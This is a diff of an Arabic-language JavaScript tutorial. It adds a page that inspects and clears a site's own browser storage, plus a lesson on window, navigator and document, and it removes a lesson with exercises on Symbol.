+function storageRows(kind) {
+  const s = window[kind];
+  const rows = [];
+  for (let i = 0; i < s.length; i++) {
+    const k = s.key(i);
+    rows.push([k, s.getItem(k).slice(0, 60) + " (" + kb(size(k) + size(s.getItem(k))) + ")"]);
+  }
+  return rows;
+}
+
+async function render() {
+  document.querySelector("#origin").textContent = location.origin;
+  const parts = [
+    ["الكوكيز (اللي JS يشوفها بس، مش HttpOnly)", () => document.cookie ? document.cookie.split("; ").map(c => { const i = c.indexOf("="); return [c.slice(0, i), decodeURIComponent(c.slice(i + 1))]; }) : [],
+      () => { for (const c of document.cookie.split("; ")) document.cookie = c.split("=")[0] + "=; max-age=0; path=/"; }],
+    ["localStorage", () => storageRows("localStorage"), () => localStorage.clear()],
+    ["sessionStorage (التاب ده بس)", () => storageRows("sessionStorage"), () => sessionStorage.clear()],
+    ["IndexedDB", async () => (await indexedDB.databases()).map(d => [d.name, "version " + d.version]),
+      async () => { for (const d of await indexedDB.databases()) indexedDB.deleteDatabase(d.name); }],
+    ["Cache API", async () => Promise.all((await caches.keys()).map(async n => [n, (await (await caches.open(n)).keys()).length + " طلب"])),
+      async () => { for (const n of await caches.keys()) await caches.delete(n); }],
+    ["Service workers (ممكن يملوا الكاش تاني بعد ما تمسحه)", async () => (await navigator.serviceWorker.getRegistrations()).map(r => [r.scope, (r.active || r.waiting || r.installing)?.state || "?"]),
+      async () => { for (const r of await navigator.serviceWorker.getRegistrations()) await r.unregister(); }],
+    ["المساحة كلها (navigator.storage)", async () => {
+      const e = await navigator.storage.estimate();
+      return [["مستخدم", kb(e.usage)], ["الحد التقريبي", (e.quota / 1024 ** 3).toFixed(1) + " GB"], ["persisted", String(await navigator.storage.persisted())]];
+    }],
+  ];
+  const sections = [];
+  for (const [title, read, clear] of parts) sections.push(section(title, await tryRows(read), clear));
+  out.replaceChildren(...sections);
+}
+
+document.querySelector("#demo").addEventListener("click", async () => {
+  if (origin === "null") return console.log("التجربة مش هتشتغل هنا: origin = null");
+  try {
+    document.cookie = "theme=dark; max-age=3600; path=/; SameSite=Lax";
+    localStorage.setItem("draft", JSON.stringify({ title: "قايمة البقالة" }));
+    sessionStorage.setItem("step", "2");
+    const db = indexedDB.open("notes-db", 1);
+    db.onupgradeneeded = () => db.result.createObjectStore("notes");
+    await new Promise(r => { db.onsuccess = () => { db.result.close(); r(); }; db.onerror = r; });
+    await (await caches.open("pages-v1")).put("/offline", new Response("أنت أوفلاين"));
+  } catch (err) {
+    console.log("التجربة وقفت عند:", err.name);
+  }
+  render();
+});
+document.querySelector("#refresh").addEventListener("click", render);
+render();
+</script>
+</body>
+</html>
 ~~~
 
-~~~json package.json
-{ "type": "module" }
+## هتشوف إيه
+
+**في الـ preview اللي فوق كل قسم مكتوب فيه «مش متاح هنا: الصفحة معزولة (origin = null)»**، وده الشكل الصح للصفحة في مكان ممنوع فيه التخزين: الـ iframe بتاع الـ preview عليه [[sandbox]] من غير [[allow-same-origin]]، فالـ origin بتاعه [["null"]]. انسخها وشغّلها من سيرفر محلي، ودوس «حط بيانات تجربة»:
+
+~~~text الناتج (Chrome 157، origin جديد على http://localhost، بعد «حط بيانات تجربة» وتسجيل SW تجربة)
+الكوكيز (اللي JS يشوفها بس، مش HttpOnly)   theme    dark
+localStorage                              draft    {"title":"قايمة البقالة"} (42 بايت)
+sessionStorage (التاب ده بس)               step     2 (5 بايت)
+IndexedDB                                 notes-db version 1
+Cache API                                 pages-v1 1 طلب
+Service workers                           http://localhost:8767/lab/  activated
+المساحة كلها (navigator.storage)           مستخدم 1.3 KB | الحد التقريبي 10.0 GB | persisted false
+
+بعد «امسح الكل» في كل قسم و «حدّث»: كلهم «فاضي»، والمستخدم 1.6 KB
 ~~~
 
-**كل Symbol وليه:**
+## ليه التصميم ده
 
-| الحتة | بتخلّي إيه يشتغل | ليه بالشكل ده |
-|---|---|---|
-| [[ *[Symbol.iterator]() ]] | spread و [[for...of]] و destructuring و [[Math.max(...)]] | generator بـ [[yield*]] على الـ array الداخلية: كل لفة iterator جديد، ومحدش يقدر يعدّل [[#items]] من برّه |
-| [[values()]] | [[filter]] و [[map]] و [[take]] (iterator helpers) | بترجّع generator object، وده بيورث من [[Iterator.prototype]] فالـ helpers موجودة ببلاش |
-| [[ *between(min, max) ]] | تاخد نطاق من غير ما تلف على الكل | generator بيقف بـ [[return]] أول ما يعدّي [[max]]، لأن القايمة مترتبة |
-| [[ async *[Symbol.asyncIterator]() ]] | [[for await]] و [[Array.fromAsync]] | عشان تتحط في أي pipeline async (زي [[summarize]] في المشروع الكبير) |
-| [[ get [Symbol.toStringTag]() ]] | [[[object SortedList(6)]]] و [[console.log]] | getter عشان الحجم يبان في اللوج |
-| [[ [Symbol.toPrimitive](hint) ]] | [[+list]] = الحجم، و [[String(list)]] = العناصر | رقم في الحساب ونص في العرض (درس «valueOf و toString و Symbol.toPrimitive») |
-| [[ static [Symbol.hasInstance] ]] | [[instanceof]] بيفحص علامة مش السلسلة | العلامة [[Symbol.for('shop.SortedList')]]: لو المكتبة اتحمّلت مرتين في نفس البرنامج، القايمة من نسخة بتبقى [[instanceof]] النسخة التانية |
+- **قسم لكل مكان، والقراية جوه [[tryRows]]:** كل مصدر ممكن يرمي لوحده (الكوكيز ممنوعة والـ IndexedDB لأ مثلًا)، فقسم ممنوع ميوقفش الباقي.
+- **[[parts]] لستة [عنوان، قراية، مسح]:** ضيف مكان جديد بسطر. ده أسهل من ٦ دوال render.
+- **[[new Blob([s]).size]]** بيدي الحجم بالبايت UTF-8 (الـ draft العربي ٤٢ بايت)، مش عدد الحروف.
+- **الجدول بـ [[insertRow]] و [[textContent]]:** قيم جاية من التخزين ممكن يبقى فيها HTML (حد حط [[<img onerror>]] في [[localStorage]])، فمفيش [[innerHTML]].
+- **مسح الكوكيز** بيكتب كل اسم بـ [[max-age=0; path=/]]. كوكي اتعملت بـ path تاني مش هتتمسح كده، ودي حدود [[document.cookie]] (مبيقولش الـ path).
 
-**القرارات والغلطات:**
+## الغلطة اللي ظهرت وهي اللي خلّت قسم الـ service workers يتضاف
 
-- **العلامة ظهرت في [[console.log]].** أول نسخة كانت [[this[BRAND] = true]]، والناتج كان [[SortedList [SortedList(6)] { Symbol(shop.SortedList): true }]]: الـ Symbol مستخبي من [[keys]] و JSON بس مش من [[console.log]] (درس Symbol). بقت [[Object.defineProperty(this, BRAND, { value: true })]] (non-enumerable) فالعرض بقى [[SortedList [SortedList(6)] {}]].
-- **التمن بتاع [[hasInstance]]:** آخر سطر في الناتج: object عادي فيه العلامة طلع [[true]]. ده مقبول لأن العلامة متسجّلة باسم بـ namespace ومحدش هيكتبها بالصدفة، بس مش حماية. لو محتاج تأكيد حقيقي إنها class بتاعتك، [[#items in x]] (brand check بالـ private field) أدق، بس مبيعدّيش بين نسختين من الـ module.
-- **[[structuredClone(prices)]] طلع [[false]]:** الـ clone بينسخ الخصايص العادية بس (لا [[#items]] ولا العلامة non-enumerable ولا الـ prototype)، فالنتيجة object فاضي. لو محتاج تبعت القايمة لـ worker، ابعت [[[...list]]] واعمل واحدة جديدة هناك.
-- **شلت [[Symbol.isConcatSpreadable]]:** كان في الخطة، بس [[concat]] بيقرا [[length]] والعناصر بأرقام ([[ list[0] ]])، والـ class دي معندهاش indices. إنك تزوّدهم عشان [[concat]] بس مش مستاهل: [[[...a, ...list]]] بيعمل نفس الشغل.` },
+أول تجربة كانت على [[localhost:8765]]: مسحنا الكاش، وبعد الـ reload رجع كاش تاني لوحده باسم مشروع قديم. السبب service worker من مشروع تاني كان اتشغّل قبل كده على **نفس البورت**: [[localhost:8765]] origin واحد لأي حاجة تشغّلها عليه، فالـ SW بتاع المشروع القديم لسه متسجّل وبيملا الكاش مع كل تحميل. عشان كده القسم ده موجود وفيه «امسح الكل» ([[registration.unregister()]]). والتجربة النهائية اتعملت على بورت جديد ([[8767]]) عشان تبدأ فاضية.
+
+## اتقاس
+
+- Playwright في Chrome 157 على [[http://localhost:8767]]: النواتج اللي فوق، و ٧ أزرار «امسح الكل» اتداسوا والكل بقى «فاضي»، ومفيش [[pageerror]].
+- نفس الملف في [[showHTML]] بتاعة الموقع (نفس الـ sandbox بتاع الـ preview): أول نسخة كانت بتسأل كل مكان وتمسك الخطأ، فطلع ٦ أقسام [[SecurityError]] وقسم المساحة [[TypeError]] (حتى [[navigator.storage.estimate()]] بترفض هناك). بس [[indexedDB.databases()]] بالذات طلّعت في Playwright خطأ صفحة تاني من غير رسالة ([[pageerror: undefined]]) مع إن الـ [[catch]] مسك الـ [[SecurityError]] بتاعها. فبقت الصفحة تفحص [[origin === "null"]] الأول ومتسألش أصلًا. بعد التعديل: ٧ أقسام «الصفحة معزولة» ومفيش ولا خطأ.` },
       ],
       items: [
         {
-          cmd: "Symbol: description و Symbol.for و Symbol.keyFor",
-          title: "Symbol يعني إيه، وليه مفتاح Symbol عمره ما يخبط في مفتاح تاني؟",
-          desc: R`[[Symbol('id')]] بيعمل قيمة primitive جديدة **فريدة**: مفيش اتنين Symbols متساويين أبدًا حتى لو ليهم نفس الوصف. فلما تستخدمه كمفتاح في object ([[ obj[id] = 101 ]]) مفيش كود تاني يقدر يكتب فوقه بالغلط، وهو مش بيظهر في [[Object.keys]] ولا [[for...in]] ولا [[JSON.stringify]].
-
-• [[sym.description]]: الوصف اللي اديته ([['id']]) كنص، للّوج والـ debugging بس.
-• [[Symbol.for('app.cache')]]: بيدوّر في registry عام للبرنامج كله: لو فيه Symbol بالمفتاح ده بيرجّعه، وإلا بيعمله ويسجّله. فكل الملفات (وحتى الـ iframes) بتاخد **نفس** الـ Symbol.
-• [[Symbol.keyFor(sym)]]: العكس: بيرجّع المفتاح لو الـ Symbol متسجّل، و [[undefined]] لو اتعمل بـ [[Symbol()]].
-
-والـ Symbol مش بيتحوّل لنص لوحده: [['key: ' + sym]] بترمي [[TypeError: Cannot convert a Symbol value to a string]]، فاستخدم [[String(sym)]] أو [[sym.description]].`,
-          example: R`// Symbol: مفتاح محدش يقدر يكتب فوقه بالغلط
-const id = Symbol('id');
-const id2 = Symbol('id');
-console.log(id === id2, typeof id, id.description, String(id));
-const user = { name: 'Sara', [id]: 101 };
-console.log(user[id], Object.keys(user), JSON.stringify(user));
-for (const key in user) console.log('for...in شاف:', key);
-console.log(Object.getOwnPropertySymbols(user), Reflect.ownKeys(user));
-const k1 = Symbol.for('app.cache');
-const k2 = Symbol.for('app.cache');
-console.log(k1 === k2, Symbol.keyFor(k1), Symbol.keyFor(id));
-try { console.log('key: ' + id); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-console.log('key: ' + id.description, $__btkey: $__{String(id)}$__bt);`,
-          try: R`اعمل object [[order]] فيه [[cache]] عادي، وخلّي «مكتبتين» يكتبوا عليه [[order.cache = ...]] واحدة ورا التانية، واطبع: التانية مسحت الأولى. وبعدين كرّر بـ [[const cacheA = Symbol('cache')]] و [[const cacheB = Symbol('cache')]] (نفس الوصف)، واطبع [[order]] كله و [[{ ...order }]] و [[structuredClone(order)]].`,
-          sol: R`~~~js collide.mjs
-const order = { id: 7, total: 250 };
-order.cache = 'من مكتبة أ';
-order.cache = 'من مكتبة ب';
-console.log(order.cache);
-const cacheA = Symbol('cache');
-const cacheB = Symbol('cache');
-order[cacheA] = 'أ'; order[cacheB] = 'ب';
-console.log(order[cacheA], order[cacheB]);
-console.log(order);
-console.log({ ...order }, Object.assign({}, order)[cacheA]);
-console.log(structuredClone(order));
+          cmd: "window و navigator و document",
+          title: "التاب والمتصفح والصفحة: التلات objects اللي JavaScript بيشوف بيهم المتصفح",
+          desc: R`أي سكربت في صفحة بيلاقي قدامه ٣ objects جاهزين: [[window]] (التاب نفسه، وهو كمان الـ global object)، و [[navigator]] (المتصفح والجهاز: اللغة، والنت، والصلاحيات)، و [[document]] (الصفحة اللي جوه التاب: شجرة الـ DOM). الدرس ده بيفرق بينهم وبيوريك أهم حاجة في كل واحد.
+• [[window]]: [[innerWidth]] و [[scrollY]] و [[location]] و [[history]] و [[setTimeout]] و [[addEventListener("resize")]]، وكل [[var]] وكل [[function]] برّه أي block بيبقوا خصايص عليه.
+• [[globalThis]]: نفس الـ global object بس بالاسم اللي شغال في كل مكان (المتصفح و Node و الـ workers).
+• [[navigator]]: [[language]] و [[languages]] و [[onLine]] و [[userAgent]] (ومتبنيش عليه قرارات)، وبوابات لـ [[clipboard]] و [[permissions]] و [[geolocation]] و [[serviceWorker]] و [[storage]].
+• [[document]]: [[documentElement]] و [[head]] و [[body]] و [[title]] و [[readyState]] و [[cookie]].`,
+          example: R`console.log(window === globalThis, window.document === document);
+var shopName = "متجر النور";
+let visits = 3;
+console.log(window.shopName, window.visits);
+console.log(innerWidth, innerHeight, location.pathname);
+console.log(navigator.language, navigator.languages, navigator.onLine);
+addEventListener("offline", () => console.log("النت قطع"));
+console.log(document.title, document.documentElement.lang, document.readyState);`,
+          try: R`افتح أي صفحة عندك من سيرفر محلي (مش [[file://]]) واكتب في الـ Console: [[Object.prototype.toString.call(window)]] و [[navigator.languages]] و [[document.readyState]]. وبعدين اعمل [[var name = 42]] واطبع [[typeof name]]. إيه اللي حصل وليه؟`,
+          sol: R`~~~js الـ Console في Chrome 157
+Object.prototype.toString.call(window)   // '[object Window]'
+navigator.languages                      // ['en-US', 'en']
+document.readyState                      // 'complete'
+var name = 42;
+typeof name                              // 'string'
+name                                     // '42'
 ~~~
 
-~~~text الناتج (Node 24.22)
-من مكتبة ب
-أ ب
-{
-  id: 7,
-  total: 250,
-  cache: 'من مكتبة ب',
-  Symbol(cache): 'أ',
-  Symbol(cache): 'ب'
-}
-{
-  id: 7,
-  total: 250,
-  cache: 'من مكتبة ب',
-  Symbol(cache): 'أ',
-  Symbol(cache): 'ب'
-} أ
-{ id: 7, total: 250, cache: 'من مكتبة ب' }
+[[name]] مش متغيّر عادي: [[window.name]] خاصية جاهزة في المتصفح (اسم التاب، بيستخدمها [[window.open]])، والـ setter بتاعها بيحوّل أي قيمة لنص. فالـ [[var]] اللي برّه أي function مكتبتش متغيّر جديد، كتبت على الخاصية دي. نفس الحكاية مع [[status]] و [[top]] و [[parent]] و [[length]]. الحل: [[let]] و [[const]] (مبيتحطوش على [[window]])، أو [[type="module"]].`,
+          teach: R`## الفكرة
+
+المتصفح برنامج كبير، والصفحة جوه منه حتة صغيرة. JavaScript بيشوف الحاجات دي من ٣ objects، وكل واحد مسؤول عن مستوى:
+
+~~~text
+navigator   المتصفح والجهاز     اللغة، النت، الصلاحيات، الكليببورد
+window      التاب ده           المقاس، الـ scroll، العنوان، التاريخ، التايمرز
+document    الصفحة جوه التاب    شجرة الـ DOM: html و head و body وكل عنصر
 ~~~
 
-- المفتاح النصي [[cache]] واحد، فالمكتبة التانية كتبت فوق الأولى من غير أي تحذير.
-- الـ Symbols الاتنين ليهم نفس الوصف بس هما **مفتاحين مختلفين**، فالقيمتين عايشين مع بعض. و [[console.log]] بيعرضهم الاتنين [[Symbol(cache)]] لأنه بيطبع الوصف بس.
-- الـ spread و [[Object.assign]] **بينسخوا** مفاتيح الـ Symbol (بينسخوا كل own enumerable، نص أو Symbol).
-- [[structuredClone]] **بيرميهم**: النسخة فيها المفاتيح النصية بس. وده نفس [[JSON.stringify]]. يعني الـ Symbol مكان كويس لداتا مؤقتة (كاش، metadata) متتبعتش للسيرفر.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** اكتب الـ ٣ سطور اللي هيطلعوا قبل ما تشغّل:
-
-~~~js
-const a = Symbol('x');
-const b = Symbol.for('x');
-console.log(a === Symbol('x'), b === Symbol.for('x'), a === b);
-console.log(a.description, b.description, Symbol.keyFor(a), Symbol.keyFor(b));
-console.log(Symbol().description, Symbol.for().description, Symbol.keyFor(Symbol.for()));
-~~~`, done: R`كتبت السطور التلاتة وطلعوا زي ما كتبت، وتقدر تقول ليه [[Symbol.for()]] من غير مفتاح وصفه مش [[undefined]] الحقيقية.`, sol: R`~~~text الناتج (Node 24.22)
-false true false
-x x undefined x
-undefined undefined undefined
-~~~
-
-- [[Symbol('x')]] كل مرة جديد، فـ [[a === Symbol('x')]] بـ [[false]]. و [[Symbol.for('x')]] بيرجّع نفس الـ Symbol من الـ registry، فـ [[true]]. و [[a]] مش متسجّل، فـ [[a === b]] بـ [[false]] مع إن الوصف واحد.
-- [[description]] موجود في الاتنين ([[x]])، بس [[Symbol.keyFor(a)]] بـ [[undefined]] لأن [[a]] مش في الـ registry.
-- السطر التالت شكله ٣ [[undefined]] بس **مش نفس الحاجة**: [[Symbol().description]] هي [[undefined]] فعلًا (اتعمل من غير وصف)، أما [[Symbol.for()]] فبيحوّل الـ argument الناقص لنص، فالمفتاح بقى النص [['undefined']]. اتجرّب: [[typeof Symbol.for().description]] بـ [['string']]، و [[Symbol.for() === Symbol.for('undefined')]] بـ [[true]]. ده سبب كفاية إنك متناديش [[Symbol.for]] من غير مفتاح.` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[tag(obj, info)]] بتلزق metadata على أي object تحت مفتاح Symbol واحد [[META]] (بتدمج مع الموجود)، و [[getMeta(obj)]] بترجّعها أو [[{}]]. لازم الـ metadata متظهرش في الـ JSON ولا في [[Object.keys]].`, done: R`بعد [[tag]] مرتين على نفس المنتج، [[JSON.stringify(product)]] فيه [[sku]] و [[price]] بس، و [[getMeta(product)]] فيه القيمتين بآخر [[source]]، و [[getMeta({})]] بـ [[{}]].`, sol: R`~~~js meta.mjs
-const META = Symbol('meta');
-function tag(obj, info) {
-  obj[META] = { ...obj[META], ...info };
-  return obj;
-}
-const getMeta = (obj) => obj[META] ?? {};
-const product = tag({ sku: 'TEA-1', price: 45 }, { fetchedAt: '2026-11-21', source: 'cache' });
-tag(product, { source: 'api' });
-console.log(JSON.stringify(product));
-console.log(Object.keys(product), getMeta(product));
-console.log(getMeta({ sku: 'X' }));
-~~~
-
-~~~text الناتج (Node 24.22)
-{"sku":"TEA-1","price":45}
-[ 'sku', 'price' ] { fetchedAt: '2026-11-21', source: 'api' }
-{}
-~~~
-
-**الشرح:** [[META]] متعرّف مرة واحدة في الـ module، فأي كود معندوش المتغير ده مش هيوصل للمفتاح بالغلط. و [[{ ...obj[META], ...info }]]: لو مفيش metadata قبل كده [[ obj[META] ]] بـ [[undefined]]، والـ spread على [[undefined]] جوه object literal مبيرميش error، فبيشتغل من أول مرة. و [[??]] بيرجّع [[{}]] لو مفيش. **الغلطة الشائعة:** [[Symbol('meta')]] جوه [[tag]] نفسها: كل نداء يعمل Symbol جديد، فـ [[getMeta]] عمرها ما تلاقي حاجة.` },
-            { lvl: 'تطبيق', t: R`**صلّح الكود البايظ:** الكود ده بيقع في سطرين. اقرا الرسالتين وصلّح:
-
-~~~js
-const ORDER_STATUS = Symbol('status');
-console.log('Log: ' + ORDER_STATUS);
-const seen = new WeakMap();
-seen.set(Symbol.for('session'), Date.now());
-~~~`, done: R`الكود بيطبع [[Log: status]] من غير error، والـ WeakMap بقى مفتاحها Symbol بيتقبل، وتقدر تقول ليه [[Symbol.for]] اترفض.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-TypeError: Cannot convert a Symbol value to a string
-TypeError: Invalid value used as weak map key
-~~~
-
-~~~js fixed.mjs
-const ORDER_STATUS = Symbol('status');
-console.log('Log: ' + ORDER_STATUS.description, 'Log: ' + String(ORDER_STATUS));
-const seen = new WeakMap();
-const sessionKey = Symbol('session');
-seen.set(sessionKey, 1);
-console.log(seen.has(sessionKey), seen.has(Symbol('session')));
-~~~
-
-~~~text الناتج (Node 24.22)
-Log: status Log: Symbol(status)
-true false
-~~~
-
-- **الأولى:** [[+]] مع نص بيحاول يحوّل الـ Symbol لنص لوحده، والـ Symbol بيرفض ده بقصد (عشان متعملش مفتاح نصي [["Symbol(status)"]] بالغلط وتفتكره هو). التحويل **الصريح** مسموح: [[String(sym)]] أو [[sym.description]].
-- **التانية:** الـ WeakMap بيقبل Symbol كمفتاح (من ES2023) **بشرط** ميكونش متسجّل. اللي من [[Symbol.for]] عايش طول عمر البرنامج في الـ registry، فمينفعش «يضعف» ويتمسح، فبيترفض. استخدم [[Symbol()]] عادي.` },
-            { lvl: 'تحدي', t: R`**مسألة:** [[describeSymbol(sym)]] بترجّع [['registered:<key>']] لو متسجّل، و [['well-known:<name>']] لو من الـ well-known ([[Symbol.iterator]] مثلًا)، و [['local:<description>']] لغير كده (والوصف الفاضي يبقى [['local:']])، و [[null]] لو مش Symbol أصلًا.`, done: R`[[describeSymbol(Symbol.for('app.user'))]] بـ [['registered:app.user']]، و [[Symbol.iterator]] بـ [['well-known:iterator']]، و [[Symbol()]] بـ [['local:']]، و [['x']] بـ [[null]]، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js describe-symbol.mjs
-function describeSymbol(sym) {
-  if (typeof sym !== 'symbol') return null;
-  const key = Symbol.keyFor(sym);
-  if (key !== undefined) return 'registered:' + key;
-  const wellKnown = Object.getOwnPropertyNames(Symbol).find((name) => Symbol[name] === sym);
-  if (wellKnown) return 'well-known:' + wellKnown;
-  return 'local:' + (sym.description ?? '');
-}
-console.log(describeSymbol(Symbol.for('app.user')), describeSymbol(Symbol.iterator), describeSymbol(Symbol('tmp')), describeSymbol(Symbol()), describeSymbol('x'));
-console.log(describeSymbol(Symbol.for('')), describeSymbol(Symbol.asyncIterator));
-~~~
-
-~~~text الناتج (Node 24.22)
-registered:app.user well-known:iterator local:tmp local: null
-registered: well-known:asyncIterator
-~~~
-
-**الشرح:** الترتيب مهم: [[Symbol.keyFor]] الأول، لأن [[Symbol.for('')]] مفتاحه نص فاضي، فلازم نقارن بـ [[!== undefined]] مش بـ truthy (وإلا كان هيطلع [['local:']] غلط). والـ well-known مش متسجّلين في الـ registry ([[Symbol.keyFor(Symbol.iterator)]] بـ [[undefined]])، فبنلاقيهم بالمقارنة مع كل خاصية على [[Symbol]] نفسه بـ [[Object.getOwnPropertyNames]]. و [[sym.description ?? '']] عشان [[Symbol()]] وصفه [[undefined]].` },
-            { lvl: 'تحدي', t: R`**قارن وقيس:** الـ Symbol «مخفي» ولا «private»؟ اعمل class فيها [[#pin]] و [[ [secret] ]] (Symbol)، وحاول توصل للاتنين من برّه الـ class بـ [[Object.keys]] و [[JSON.stringify]] و [[Object.getOwnPropertySymbols]] و [[Reflect.ownKeys]].`, done: R`عرفت إن الـ Symbol اتقرا من برّه بـ [[getOwnPropertySymbols]]، والـ [[#pin]] مفيش أي طريقة توصله من برّه، وكتبت جملة: إمتى تختار ده وإمتى ده.`, sol: R`~~~js hidden-vs-private.mjs
-const secret = Symbol('secret');
-class Account {
-  #pin = 1234;
-  [secret] = 'S-99';
-  checkPin(p) { return p === this.#pin; }
-}
-const acc = new Account();
-console.log(Object.keys(acc), JSON.stringify(acc));
-const found = Object.getOwnPropertySymbols(acc)[0];
-console.log(found, acc[found]);
-console.log(Reflect.ownKeys(acc));
-try { console.log(eval('acc.#pin')); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-~~~
-
-~~~text الناتج (Node 24.22)
-[] {}
-Symbol(secret) S-99
-[ Symbol(secret) ]
-SyntaxError: Private field '#pin' must be declared in an enclosing class
-~~~
-
-**الإجابة:** الـ Symbol **مستخبي من اللف العادي** (keys و JSON و for...in) بس **مش private**: أي حد يقدر يجيبه بـ [[Object.getOwnPropertySymbols]] أو [[Reflect.ownKeys]] ويقرا القيمة. أما [[#pin]] فمحمي من اللغة نفسها: حتى [[Reflect.ownKeys]] مبيشوفوش، والكود برّه الـ class مش بيتكمبايل أصلًا. فـ: [[#]] للأسرار والحالة الداخلية لـ class، والـ Symbol لـ «بروتوكول» أو metadata عايز كود تاني **يقدر** يستخدمها لو معاه المفتاح (زي [[Symbol.iterator]] بالظبط).` },
-          ],
-          check: { lang: "js", starter: R`function describeSymbol(sym) {
-  // registered:<key> أو well-known:<name> أو local:<description> أو null
-}`, tests: R`test("متسجّل", () => expect(describeSymbol(Symbol.for('app.user'))).toBe('registered:app.user'));
-test("متسجّل بمفتاح فاضي", () => expect(describeSymbol(Symbol.for(''))).toBe('registered:'));
-test("well-known", () => expect(describeSymbol(Symbol.iterator)).toBe('well-known:iterator'));
-test("well-known تاني", () => expect(describeSymbol(Symbol.toStringTag)).toBe('well-known:toStringTag'));
-test("local بوصف", () => expect(describeSymbol(Symbol('tmp'))).toBe('local:tmp'));
-test("local من غير وصف", () => expect(describeSymbol(Symbol())).toBe('local:'));
-test("مش Symbol", () => expect(describeSymbol('x')).toBe(null));`, solution: R`function describeSymbol(sym) {
-  if (typeof sym !== 'symbol') return null;
-  const key = Symbol.keyFor(sym);
-  if (key !== undefined) return 'registered:' + key;
-  const wellKnown = Object.getOwnPropertyNames(Symbol).find((name) => Symbol[name] === sym);
-  if (wellKnown) return 'well-known:' + wellKnown;
-  return 'local:' + (sym.description ?? '');
-}` },
-          flag: "script",
-          deep: {
-            why: R`أي كود بيلزق حاجة على object مش بتاعه (مكتبة كاش، framework بيعلّم الـ objects اللي عملها، أداة debugging) معرّض إنه يخبط في مفتاح موجود أو يتخبط فيه. الـ Symbol بيحل ده من غير اتفاق على أسامي: المفتاح فريد بطبيعته. وده نفس السبب اللي خلّى اللغة نفسها تضيف [[Symbol.iterator]] و [[Symbol.toPrimitive]] من غير ما تكسر كود قديم كان عنده خاصية اسمها [[iterator]].`,
-            how: R`[[Symbol(desc)]] بيعمل قيمة primitive سابع (بعد string و number و bigint و boolean و undefined و null) جديدة كل مرة، والوصف بيتحفظ جواها للعرض بس ومبيدخلش في المقارنة. والمفاتيح في الـ object نوعين بس: string و Symbol، وأي حاجة تانية بتتحوّل لـ string. فالـ object بيخزّن مفاتيح الـ Symbol في نفس جدول الخصايص، بس الـ operations اللي «بتعدّ» المفاتيح ([[Object.keys]] و [[for...in]] و [[JSON.stringify]] و [[Object.entries]]) بتتخطاها بقصد، واللي بتنسخ ([[Object.assign]] و spread) بتاخدها.
-
-[[Symbol.for(key)]] بيحوّل [[key]] لنص ويدوّر في جدول واحد للـ agent كله (حسب المواصفة الجدول ده مشترك بين كل الـ realms، زي الصفحة والـ iframes بتاعتها)، و [[Symbol.keyFor]] بيدوّر بالعكس. و [[new Symbol()]] ممنوع ([[TypeError: Symbol is not a constructor]]) عشان محدش يعمل wrapper object بالغلط، ولو محتاجه فعلًا: [[Object(sym)]].`,
-            when: R`Symbol عادي ([[Symbol()]]): مفتاح داخلي لـ module أو مكتبة، metadata على objects مش بتاعتك، قيم enum مينفعش تتلخبط مع نص (مشروع «enum حالات الطلب» في الوحدة). [[Symbol.for]]: لما كذا نسخة من نفس المكتبة (أو كذا bundle أو iframe) لازم تتفق على نفس المفتاح، وده بيحصل فعلًا: React بيعلّم الـ objects اللي بيعملها بـ Symbol من [[Symbol.for]]، عشان نسختين من React في نفس الصفحة يعرفوا عناصر بعض. والمفتاح بيتكتب بـ namespace ([['myapp.cache']]) عشان الجدول عام لكل الكود. [[description]]: للّوج والرسايل بس، متبنيش عليه منطق.`,
-            mistakes: R`- [[Symbol('x') === Symbol('x')]] مستنيها [[true]]: كل نداء جديد.
-- تعمل الـ Symbol جوه الدالة اللي بتستخدمه، فكل مرة مفتاح جديد ومش لاقي القديم. اعمله مرة واحدة برّه.
-- [[obj.sym]] بدل [[ obj[sym] ]]: النقطة معناها المفتاح النصي [['sym']].
-- [['x' + sym]] أو template literal: [[TypeError: Cannot convert a Symbol value to a string]]. استخدم [[String(sym)]] أو [[description]].
-- [[+sym]]: [[TypeError: Cannot convert a Symbol value to a number]].
-- تفتكر الـ Symbol private: [[Object.getOwnPropertySymbols]] بيجيبه. الـ private الحقيقي [[#field]].
-- تبعت object فيه Symbols في JSON أو [[structuredClone]] أو [[postMessage]] ومستني توصل: بتتشال. والـ Symbol نفسه كقيمة: [[JSON.stringify(sym)]] بـ [[undefined]]، وجوه array بيبقى [[null]]، و [[structuredClone(sym)]] بيرمي [[DataCloneError]] (اتجرّب: [[DOMException: Symbol(id) could not be cloned.]]).
-- [[Symbol.for]] كمفتاح WeakMap: [[TypeError: Invalid value used as weak map key]].`,
-          },
-          teach: R`## الفكرة في سطر
-
-الـ Symbol قيمة فريدة بتستخدمها كـ «اسم» لخاصية: مفيش حد يقدر يكتب نفس الاسم بالصدفة، فمفيش تصادم. كل الناتج من Node 24.22 على ويندوز 11 (ملف [[.mjs]]).
+الترتيب ده مهم: [[document]] و [[navigator]] نفسهم خصايص على [[window]] ([[window.document]] و [[window.navigator]])، فـ [[window]] هو الأب. كل النواتج تحت من Chrome 157 على صفحة متقدّمة من سيرفر محلي ([[http://localhost]])، إلا لو مكتوب Node.
 
 ---
 
-## ١. [[Symbol()]]: كل نداء قيمة جديدة
+## ١. [[window]]: التاب، والـ global object كمان
 
-~~~js
-const id = Symbol('id');
-const id2 = Symbol('id');
-console.log(id === id2, typeof id, id.description, String(id));
-~~~
-
-~~~text الناتج
-false symbol id Symbol(id)
-~~~
-
-| الحتة | معناها |
-|---|---|
-| [[Symbol('id')]] | بيعمل Symbol جديد. الـ [[('id')]] **وصف** للعرض بس، مش اسم ومش مفتاح، ونفس الوصف مرتين = اتنين مختلفين |
-| [[id === id2]] | [[false]]: كل Symbol ليه هوية لوحده، زي الـ objects، مع إنه primitive |
-| [[typeof id]] | [['symbol']]: نوع primitive لوحده (السابع) |
-| [[String(id)]] | التحويل الصريح لنص بيدّي [['Symbol(id)']] |
-
-ومن غير [[new]]: [[new Symbol('x')]] بيرمي [[TypeError: Symbol is not a constructor]].
-
----
-
-## ٢. [[Symbol.prototype.description]]: الوصف كنص
-
-[[id.description]] بيرجّع [['id']] من غير كلمة [[Symbol(...)]] حواليه. فيه ٣ حالات اتجرّبت:
-
-| الـ Symbol | [[description]] |
-|---|---|
